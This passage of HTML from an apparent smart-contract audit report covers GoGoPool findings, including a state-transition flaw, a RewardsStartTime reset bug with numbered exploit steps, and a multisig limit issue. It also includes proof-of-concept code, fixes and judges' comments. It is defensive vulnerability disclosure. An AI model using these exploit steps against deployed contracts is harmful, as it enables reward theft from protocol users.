class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXAssigned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXAssignedHighWater</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// now try to launch the second operator&#39;s pool, it will fail with InsufficientContractBalance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">InsufficientContractBalance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndInitiateStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual Review, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Make sure to keep the node operator’s deposit status the same for all states that can lead to the same state.<br>\nFor example, for all states that can transition to Prelaunch, make sure to send the AVAX back to the user and get them back on the call <code>recreateMiniPool()</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/569\">emersoncloud (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/569#issuecomment-1408511782\">0xju1ie (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>I think <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/213\">#213</a> might be a better primary. This one primarily depends on minipools going to staking->error which wouldn’t actually happen unless Rialto made a mistake.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/569#issuecomment-1415814227\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown an issue with the FSM, Pools are allowed to perform the following transition<br>\n<code>Prelaunch->Launched->Staking->Error->Finished->Prelaunch</code> which allows to spin up the pool without funds.</p>\n<p>This could only happen if Rialto performs a mistake, so the finding is limited to highlighting the issue with the State Transition.</p>\n<p>For this reason, I believe Medium to be the most appropriate severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/569#issuecomment-1415883621\">Franfran (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@Alex the Entreprenerd - Please note that the issue is not limited to Rialto doing a mistake, but it’s actually possible to trick it by frontrunning the Rialto transaction as outlined in my finding: <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/484#issuecomment-1382584856\">#484 (comment)</a><br>\nThat’s why the high severity was chosen initially.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Atomically recreate minipool so a node operator can’t withdraw inbetween: <a href=\"https://github.com/multisig-labs/gogopool/pull/23\">multisig-labs/gogopool#23</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/15\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/34\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"m-10-functions-cancelminipool-doesnt-reset-the-value-of-the-rewardsstarttime-for-user-when-users-minipoolcount-is-zero\" style=\"position:relative;\"><a href=\"#m-10-functions-cancelminipool-doesnt-reset-the-value-of-the-rewardsstarttime-for-user-when-users-minipoolcount-is-zero\" aria-label=\"m 10 functions cancelminipool doesnt reset the value of the rewardsstarttime for user when users minipoolcount is zero permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/555\">[M-10] Functions <code>cancelMinipool()</code> doesn’t reset the value of the <code>RewardsStartTime</code> for user when user’s <code>minipoolcount</code> is zero</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/555\">unforgiven</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/522\">caventa</a> and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/251\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L271-L283\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L271-L283</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L642-L665\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L642-L665</a></p>\n<p>The value of <code>RewardsStartTime</code>  shows when node runner started the minipool and validation rewards are generated by node runner. it is used to see if node runners are eligible for ggp rewards or not and node runners should run their node for minimum amount of time during the rewarding cycle to be eligible for rewards. but right now node runner can create a mimipool and cancel it (after waiting time) and even so the minipool generated no rewards and cancelled the value of <code>RewardsStartTime</code> won’t get reset for node runner and in the end of the cycle node runner would be eligible for rewards (node runner can create another minipool near the end of cycle). so this issue would cause wrong reward distribution between node runners and code doesn’t correctly track <code>RewardsStartTime</code> for node runners and malicious node runners can use this issue and receive rewards without running validation nodes for the minimum amount of required time.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>cancelMinipool()</code> and <code>_cancelMinipoolAndReturnFunds()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction cancelMinipool(address nodeID) external nonReentrant {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tStaking staking = Staking(getContractAddress(&quot;Staking&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tProtocolDAO dao = ProtocolDAO(getContractAddress(&quot;ProtocolDAO&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tint256 index = requireValidMinipool(nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tonlyOwner(index);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// make sure they meet the wait period requirement</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (block.timestamp - staking.getRewardsStartTime(msg.sender) &lt; dao.getMinipoolCancelMoratoriumSeconds()) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trevert CancellationTooEarly();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t_cancelMinipoolAndReturnFunds(nodeID, index);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction _cancelMinipoolAndReturnFunds(address nodeID, int256 index) private {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\trequireValidStateTransition(index, MinipoolStatus.Canceled);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, index, &quot;.status&quot;)), uint256(MinipoolStatus.Canceled));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\taddress owner = getAddress(keccak256(abi.encodePacked(&quot;minipool.item&quot;, index, &quot;.owner&quot;)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 avaxNodeOpAmt = getUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, index, &quot;.avaxNodeOpAmt&quot;)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, index, &quot;.avaxLiquidStakerAmt&quot;)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tStaking staking = Staking(getContractAddress(&quot;Staking&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.decreaseAVAXStake(owner, avaxNodeOpAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.decreaseAVAXAssigned(owner, avaxLiquidStakerAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.decreaseMinipoolCount(owner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\temit MinipoolStatusChanged(nodeID, MinipoolStatus.Canceled);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tVault vault = Vault(getContractAddress(&quot;Vault&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvault.withdrawAVAX(avaxNodeOpAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\towner.safeTransferETH(avaxNodeOpAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p>As you can see there is no check that user’s minipool count is zero and if it is to reset the value of <code>RewardsStartTime</code> for user so if a user creates a minipool in the start of the cycle and then cancel it after 5 days and wait for end of the cycle and start another minipool and increase his staking AVAX he would be eligible for ggp rewards (<code>ClaimNodeOp.isEligible()</code> would return <code>true</code> for that user even so the user didn’t run node for the required amount of time in the cycle). these are the steps to exploit this:</p>\n<ol>\n<li>node runner would create a minipool near start time of the ggp rewarding cycle and the value of <code>RewardsStartTime</code> would set for node runner.</li>\n<li>after 5 days that node runner’s minipool has not been launched by multisig (for any reason) node runner would call <code>cancelMinipool()</code> and code would cancel his minipool but won’t reset <code>RewardsStartTime</code> for node runner.</li>\n<li>after 20 days and near end of the gpp reward cycle node runner would create another minipool and start running node.</li>\n<li>in the end even so node runner only start running node and earning reward near end of the reward cycle but code would count node runner as eligible for rewards because <code>RewardsStartTime</code> for node runner shows wrong value.</li>\n</ol>\n<p>This bug would cause rewards to be distributed wrongly between node runners and malicious node runners can bypass required time for running nodes during reward cycle to be eligible for rewards.</p>\n<h3 id=\"tools-used-6\" style=\"position:relative;\"><a href=\"#tools-used-6\" aria-label=\"tools used 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Set the value of <code>RewardsStartTime</code> based on successfully finished minipools or when minipool is launched and user can’t cancel minipool.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/555#issuecomment-1412633697\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to <code>cancelMinipool</code> not resetting <code>rewardsStartTime</code> a pool owner could receive rewards for time in which they did not have any activePool.</p>\n<p>Because this is contingent on the Multisig not cancelling the pool and because it would limit the attack to rewards, I believe Medium Severity to be the most appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Reset rewards start time in cancel minipool: <a href=\"https://github.com/multisig-labs/gogopool/pull/51\">multisig-labs/gogopool#51</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/16\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/35\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"m-11-multisigmanager-may-not-be-able-to-add-a-valid-multisig\" style=\"position:relative;\"><a href=\"#m-11-multisigmanager-may-not-be-able-to-add-a-valid-multisig\" aria-label=\"m 11 multisigmanager may not be able to add a valid multisig permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/521\">[M-11] MultisigManager may not be able to add a valid Multisig</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/521\">bin2chen</a>, also found by <a href=\"undefined\">immeas</a>, <a href=\"undefined\">RaymondFam</a>, <a href=\"undefined\">ast3ros</a>, <a href=\"undefined\">cryptonue</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/828\">0xhunter</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/765\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/349\">0xbepresent</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/189\">Saintcode_</a></em></p>\n<p>When more than 10 mulitsig, it is impossible to modify or delete the old ones, making it impossible to create new valid ones.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>MultisigManager limits the number of Multisig to 10, which cannot be deleted or replaced after they have been disabled.<br>\nThis will have a problem, if the subsequent use of 10, all 10 for some reason, be disabled.<br>\nThen it is impossible to add new ones and replace the old ones, so you have to continue using the old Multisig at risk.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">registerMultisig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGuardian</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">multisigIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getIndexOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">multisigIndex</span><span class=\"mtk1\"> != -</span><span class=\"mtk7\">1</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MultisigAlreadyRegistered</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;multisig.count&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">index</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">MULTISIG_LIMIT</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MultisigLimitReached</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">//***@audit limt 10, and no other way to delete or replace the old Multisig ***//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add replace old mulitsig method</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">replaceMultisig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oldAddr</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGuardian</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">multisigIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getIndexOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oldAddr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">multisigIndex</span><span class=\"mtk1\"> == -</span><span class=\"mtk7\">1</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MultisigNotFound</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">setAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;multisig.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">multisigIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.address&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RegisteredMultisig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/521\">emersoncloud (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/521#issuecomment-1396847761\">0xju1ie (GoGoPool) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>I’d argue Low since its unlikely.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/521#issuecomment-1396857560\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>I disagree @0xju1ie. I think it’s an oversight not to have a way to delete old multisigs with the limit in place rather than a quality assurance issue. </p>\n</blockquote>\n<p><strong><a 